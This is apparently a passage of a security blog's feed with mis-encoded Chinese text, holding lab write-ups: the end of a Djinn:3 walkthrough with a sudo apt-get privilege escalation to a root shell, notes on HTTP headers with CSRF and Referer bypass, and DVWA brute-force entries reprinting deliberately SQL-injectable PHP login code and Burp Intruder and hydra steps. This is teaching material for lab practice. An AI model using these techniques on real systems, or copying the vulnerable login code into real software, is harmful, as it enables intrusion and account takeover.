/><p>ä½†æ˜¯å¹¶æ²¡æœ‰rootæƒé™ï¼Œçœ‹ä¸€ä¸‹<code>/etc/sudoer</code></p><img src="Djinn:3/image-20200721195110455.png" alt="image-20200721195110455" style="zoom:50%;" /><p>åˆ›å»ºä¸€ä¸ªjasonç”¨æˆ·ï¼Œä»–å°±å¯ä»¥ä½¿ç”¨<code>(root)apt-get</code></p><img src="Djinn:3/image-20200721195258743.png" alt="image-20200721195258743" style="zoom:50%;" /><p>è¾“å…¥<code>jason@djinn3:/home/saint$ sudo -u root /usr/bin/apt-get changelog bash</code></p><img src="Djinn:3/image-20200721195556621.png" alt="image-20200721195556621" style="zoom:50%;" /><p>ç„¶åå°±å¾—åˆ°äº†ä¸€ä¸ªrootçš„shell</p><img src="Djinn:3/image-20200721195634576.png" alt="image-20200721195634576" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> Djinn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> command-injection </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>httpå“åº”å¤´</title>
      <link href="/http_header.html"/>
      <url>/http_header.html</url>
      
        <content type="html"><![CDATA[<p><strong>HTTPè¯·æ±‚æŠ¥æ–‡ç”±3éƒ¨åˆ†ç»„æˆï¼ˆè¯·æ±‚è¡Œ+è¯·æ±‚å¤´+è¯·æ±‚ä½“ï¼‰</strong></p><a id="more"></a><p>httpè¯·æ±‚å¤´åŒ…å«çš„å†…å®¹å¾ˆå¤šï¼Œè¿™é‡Œåˆ—å‡ºæ¯”è¾ƒå¸¸ç”¨å’Œæ¯”è¾ƒé‡è¦çš„ä¸ªåˆ«</p><p>å…¶ä»–çš„httpç›¸åº”å¤´å¯ä»¥å‚è€ƒ<a href="http://tools.jb51.net/table/http_header">ç›¸åº”å¤´å’Œå¯¹ç…§è¡¨</a></p><p><a href="https://blog.csdn.net/weixin_38087538/article/details/82838762">æœ¬æ–‡å‚è€ƒåšæ–‡</a></p><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><h3 id="Refererç®€ä»‹"><a href="#Refererç®€ä»‹" class="headerlink" title="Refererç®€ä»‹"></a>Refererç®€ä»‹</h3><p>Referer:è¡¨ç¤ºè¿™ä¸ªè¯·æ±‚æ˜¯ä»å“ªä¸ªurlè·³è¿‡æ¥çš„,é€šè¿‡ç™¾åº¦æ¥æœç´¢æ·˜å®ç½‘,é‚£ä¹ˆåœ¨è¿›å…¥æ·˜å®ç½‘çš„è¯·æ±‚æŠ¥æ–‡ä¸­,Refererçš„å€¼å°±æ˜¯: <code>www.baidu.com</code>ã€‚å¦‚æœæ˜¯ç›´æ¥è®¿é—®å°±ä¸ä¼šæœ‰è¿™ä¸ªå¤´ã€‚</p><p>ä»ç™¾åº¦è®¿é—®æŸä¸ªç½‘ç«™ï¼š</p><img src="http_header/image-20200721143939974.png" alt="image-20200721143939974" style="zoom:67%;" /><h3 id="CSRFæ”»å‡»"><a href="#CSRFæ”»å‡»" class="headerlink" title="CSRFæ”»å‡»"></a>CSRFæ”»å‡»</h3><p>åœ¨æœåŠ¡å™¨ç«¯éªŒè¯<code>Referer</code>å­—æ®µï¼Œä»¥ç¡®å®šä½¿ç”¨è€…æ˜¯å¦é€šè¿‡æ­£å¸¸é€”å¾„è®¿é—®ã€‚</p><p>æ¯”å¦‚éœ€è¦è®¿é—® <code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>ï¼Œç”¨æˆ·å¿…é¡»å…ˆç™»é™† <code>bank.example</code>ï¼Œç„¶åé€šè¿‡ç‚¹å‡»é¡µé¢ä¸Šçš„æŒ‰é’®æ¥è§¦å‘è½¬è´¦äº‹ä»¶ã€‚è¿™æ—¶ï¼Œè¯¥è½¬å¸è¯·æ±‚çš„ Referer å€¼å°±ä¼šæ˜¯è½¬è´¦æŒ‰é’®æ‰€åœ¨çš„é¡µé¢çš„ URLï¼Œé€šå¸¸æ˜¯ä»¥ <code>bank.example</code> åŸŸåå¼€å¤´çš„åœ°å€ã€‚</p><p>è€Œå¦‚æœé»‘å®¢è¦å¯¹é“¶è¡Œç½‘ç«™å®æ–½ CSRF æ”»å‡»ï¼Œä»–åªèƒ½åœ¨ä»–è‡ªå·±çš„ç½‘ç«™æ„é€ è¯·æ±‚ï¼Œå½“ç”¨æˆ·é€šè¿‡é»‘å®¢çš„ç½‘ç«™å‘é€è¯·æ±‚åˆ°é“¶è¡Œæ—¶ï¼Œè¯¥è¯·æ±‚çš„ Referer æ˜¯æŒ‡å‘<strong>é»‘å®¢è‡ªå·±çš„ç½‘ç«™</strong>ã€‚å› æ­¤ï¼Œè¦é˜²å¾¡ CSRF æ”»å‡»ï¼Œé“¶è¡Œç½‘ç«™åªéœ€è¦å¯¹äºæ¯ä¸€ä¸ªè½¬è´¦è¯·æ±‚éªŒè¯å…¶ Referer å€¼ï¼Œå¦‚æœæ˜¯ä»¥ <code>bank.example</code> å¼€å¤´çš„åŸŸåï¼Œåˆ™è¯´æ˜è¯¥è¯·æ±‚æ˜¯æ¥è‡ªé“¶è¡Œç½‘ç«™è‡ªå·±çš„è¯·æ±‚ï¼Œæ˜¯åˆæ³•çš„ã€‚å¦‚æœ Referer æ˜¯å…¶ä»–ç½‘ç«™çš„è¯ï¼Œåˆ™æœ‰å¯èƒ½æ˜¯é»‘å®¢çš„ CSRF æ”»å‡»ï¼Œæ‹’ç»è¯¥è¯·æ±‚ã€‚</p><h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><ol><li> æŠ“åŒ…ä¿®æ”¹</li><li> å¦‚æœæ˜¯ç”Ÿæ´»å½“ä¸­å¯ä»¥åœ¨æŠŠæ–‡ä»¶æ”¾åœ¨æœ¬æœºä¸Šå‘½åä¸º<code>[server_name].html</code>ï¼Œç„¶åè·³è½¬åˆ°ç›®æ ‡é¡µé¢ï¼Œé‚£æ—¶çš„refereråº”è¯¥æ˜¯<code>http://æœ¬æœºIP/æœåŠ¡å™¨IP.txt</code>ï¼Œåˆ©ç”¨æ–‡ä»¶åä¹Ÿå¯ä»¥ç»•è¿‡ã€‚</li></ol><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p><a href="https://www.cnblogs.com/magicg/p/12870215.html">å…³äºCookieå’ŒCSRFã€XSSå¯ä»¥çœ‹è¿™ç¯‡</a></p><h3 id="Cookieç®€ä»‹"><a href="#Cookieç®€ä»‹" class="headerlink" title="Cookieç®€ä»‹"></a>Cookieç®€ä»‹</h3><p><a href="https://www.cnblogs.com/fnng/archive/2012/08/14/2637279.html">Cookie</a>ï¼Œæ˜¯ç”¨äºä¿å­˜ç›¸å…³ä¿¡æ¯ï¼ŒæŒ‡ç¤º ä½ æ˜¯è° ä½œç”¨çš„ï¼ˆï¼Ÿï¼‰</p><p>å¹³æ—¶ç™»å½•æŸç½‘ç«™ä¹‹åï¼Œä¸€æ®µæ—¶é—´å†…è®¿é—®ä¸éœ€è¦ç™»å½•å°±æ˜¯å› ä¸ºCookie</p><p>æœåŠ¡å™¨é€šè¿‡åœ¨HTTPçš„å“åº”å¤´ä¸­åŠ ä¸Šä¸€è¡Œç‰¹æ®Šçš„æŒ‡ç¤ºä»¥æç¤º<strong>æµè§ˆå™¨æŒ‰ç…§æŒ‡ç¤ºç”Ÿæˆç›¸åº”çš„cookie</strong>ã€‚ç„¶è€Œçº¯ç²¹çš„å®¢æˆ·ç«¯è„šæœ¬å¦‚<code>JavaScript</code>æˆ–è€…<code>VBScript</code>ä¹Ÿå¯ä»¥ç”Ÿæˆcookieã€‚è€Œcookieçš„ä½¿ç”¨æ˜¯ç”±æµè§ˆå™¨æŒ‰ç…§ä¸€å®šçš„åŸåˆ™åœ¨åå°è‡ªåŠ¨å‘é€ç»™æœåŠ¡å™¨çš„ã€‚</p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>ç”±äºCookieå¯ä»¥ç”¨æ¥ç»•è¿‡ç™»å½•ã€æ¬ºéª—æœåŠ¡å™¨ï¼Œæ‰€ä»¥å¯ä»¥è¢«ç”¨äºCSRFæ”»å‡»ã€‚</p><p>è§£å†³æ–¹æ³•ï¼šä½¿ç”¨ <code>Token</code> æ›¿ä»£ <code>Cookie</code>ç­‰ã€‚</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>ç”±äºCookieå­˜æ”¾åœ¨æœ¬åœ°ï¼Œä¸”<code>JavaScript</code>å¯ä»¥è½»æ˜“çš„è·å–(ä¾‹å¦‚ä½¿ç”¨<code>document.cookie</code>ç­‰)ï¼Œè·¨ç«™è„šæœ¬å¯ä»¥è·å–åˆ°Cookieä¿¡æ¯ã€‚</p><h2 id="host"><a href="#host" class="headerlink" title="host"></a>host</h2><p>æŒ‡å®šæœåŠ¡å™¨çš„åŸŸåå’Œç«¯å£å·</p><h2 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h2><p><a href="https://tool.oschina.net/commons/">å¯¹ç…§è¡¨</a></p><p><code>Content-Type</code>æ˜¯Httpçš„å®ä½“é¦–éƒ¨å­—æ®µï¼Œåœ¨<strong>requestçš„è¯·æ±‚è¡Œï¼ˆæˆ–responseçš„çŠ¶æ€ç ï¼‰ä¹‹å</strong>ã€‚ç”¨äºè¯´æ˜è¯·æ±‚æˆ–è¿”å›çš„æ¶ˆæ¯ä¸»ä½“æ˜¯ç”¨ä½•ç§æ–¹å¼ç¼–ç ï¼Œåœ¨<code>request header</code>å’Œ<code>response header</code>é‡Œéƒ½å­˜åœ¨ã€‚</p><h3 id="uploads"><a href="#uploads" class="headerlink" title="uploads"></a>uploads</h3><p>æ–‡ä»¶ä¸Šä¼ å¯èƒ½ä¼šæ£€æŸ¥å¯¹åº”çš„<code>Content-Type</code>æ¥ç¡®å®šä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ï¼Œé˜²æ­¢æœ¨é©¬ä¸Šä¼ ã€‚</p><p>ä¾‹å¦‚dvwaçš„uploads(middle)é¢˜</p><hr><p>è¿˜æœ‰å•¥æƒ³åˆ°å†å†™</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa-brute-force</title>
      <link href="/brute-force.html"/>
      <url>/brute-force.html</url>
      
        <content type="html"><![CDATA[<p>dvwaé¶åœºçš„æš´åŠ›ç ´è§£éƒ¨åˆ†</p><p>æš´åŠ›ç ´è§£å–å†³äºå¯†ç æœ¬</p><p>å¥½ç”¨çš„å¯†ç æœ¬äº‹åŠåŠŸå€</p><a id="more"></a><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”šè‡³å¯ä»¥sqlæ³¨å…¥ã€‚</p><p>åœ¨é¡µé¢æŠ“åŒ…ä¹‹åé€‰æ‹©<code>send to Intruder</code></p><img src="dvwa-brute-force/image-20200721101658090.png" alt="image-20200721101658090" style="zoom:50%;" /><p>ç„¶ååœ¨<code>position</code>ç•Œé¢passwordåœ°æ–¹å¢åŠ æ ‡è®°ï¼Œå…¶ä»–çš„æ ‡è®°æ¸…é™¤</p><img src="dvwa-brute-force/image-20200721102030788.png" alt="image-20200721102030788" style="zoom:50%;" /><p>å‰å¾€payloadç•Œé¢ï¼Œé€‰æ‹©<code>payloads</code>ï¼Œstart attackå³å¯</p><img src="dvwa-brute-force/image-20200721102153217.png" alt="image-20200721102153217" style="zoom:50%;" /><p>å‘ç°ä¸€ä¸ªè¿”å›é•¿åº¦ä¸ä¸€æ ·</p><img src="dvwa-brute-force/image-20200721102255259.png" alt="image-20200721102255259" style="zoom:50%;" /><p>å°è¯•ç™»é™†ï¼ŒæˆåŠŸ</p><img src="dvwa-brute-force/image-20200721102315065.png" alt="image-20200721102315065" style="zoom:50%;" /><h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>é’ˆå¯¹sqlæ³¨å…¥èµ·äº†ä¿æŠ¤æªæ–½ï¼Œä½†æ˜¯sqlmapç…§æ ·æ³¨å…¥äº†ã€‚ã€‚ã€‚</p><p>ä½†æ˜¯å¯¹äºçˆ†ç ´å¹¶æ²¡ä»€ä¹ˆé˜»ç¢ï¼Œå’Œ<a href="#low">low</a>ä¸€æ ·å°±è¡Œäº†</p><img src="dvwa-brute-force/image-20200721103614652.png" alt="image-20200721103614652" style="zoom:50%;" /><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å¯ä»¥æ³¨å…¥ï¼ˆ</p><p>æ­¥éª¤éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯è¿™æ¬¡å¯¹äºå­—å…¸æœ‰ä¸€å®šçš„è¦æ±‚äº†</p><p>ä¹‹å‰æˆ‘é‚£æœ¬å­—å…¸ä¸å¤Ÿç”¨äº†ï¼Œæ‰€ä»¥å°±æ²¡æœ‰çˆ†ç ´å‡ºæ¥</p><p>ä½¿ç”¨<code>hydra + rock_you</code>å°±çˆ†å‡ºæ¥äº†ï¼ˆä¸è¿‡å‡ºæ¥äº†å¾ˆå¤šï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> dvwa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>one_gadgetæ¡ä»¶çš„æ¢å¯»</title>
      <link href="/one_gadget.html"/>
      <url>/one_gadget.html</url>
      
